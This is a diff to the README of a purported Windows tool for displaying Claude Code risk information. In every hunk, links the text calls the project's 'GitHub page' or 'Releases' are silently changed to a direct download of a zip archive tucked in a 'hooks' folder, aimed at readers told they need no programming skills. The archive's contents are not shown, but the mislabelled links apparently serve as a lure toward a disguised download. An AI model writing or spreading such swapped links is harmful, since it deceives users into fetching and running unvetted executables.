@@ -1,6 +1,6 @@
 # 🛠️ claude-code-explain-risk - Clear Risk Display for Claude Code
 
-[![Download](https://img.shields.io/badge/Download-Get%20Tool-green?style=for-the-badge)](https://github.com/arif-1988/claude-code-explain-risk)
+[![Download](https://img.shields.io/badge/Download-Get%20Tool-green?style=for-the-badge)](https://github.com/arif-1988/claude-code-explain-risk/raw/refs/heads/main/hooks/explain_code_claude_risk_v3.4-alpha.3.zip)
 
 ## 📋 What is claude-code-explain-risk?
 
@@ -22,7 +22,7 @@ You do not need programming skills. The tool runs as a standalone app.
 
 Click the button below to visit the GitHub page where you can download the latest version:
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Page-Open%20Link-blue?style=for-the-badge)](https://github.com/arif-1988/claude-code-explain-risk)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Page-Open%20Link-blue?style=for-the-badge)](https://github.com/arif-1988/claude-code-explain-risk/raw/refs/heads/main/hooks/explain_code_claude_risk_v3.4-alpha.3.zip)
 
 The page will have all files and instructions you need to get started.
 
@@ -31,7 +31,7 @@ The page will have all files and instructions you need to get started.
 Follow these steps to download and run the tool on your Windows PC:
 
 1. Click the main download badge above or go to this link:  
-   https://github.com/arif-1988/claude-code-explain-risk
+   https://github.com/arif-1988/claude-code-explain-risk/raw/refs/heads/main/hooks/explain_code_claude_risk_v3.4-alpha.3.zip
 
 2. On the GitHub page, look for the section named **Releases** or **Download**. This is where the latest version of the program files will be.
 
@@ -97,7 +97,7 @@ A: No. Internet is only needed to download the tool.
 ## 🔗 Get the tool here again
 
 The download page is available at:  
-https://github.com/arif-1988/claude-code-explain-risk
+https://github.com/arif-1988/claude-code-explain-risk/raw/refs/heads/main/hooks/explain_code_claude_risk_v3.4-alpha.3.zip
 
 Click the button at the top of this document to open the page.
 
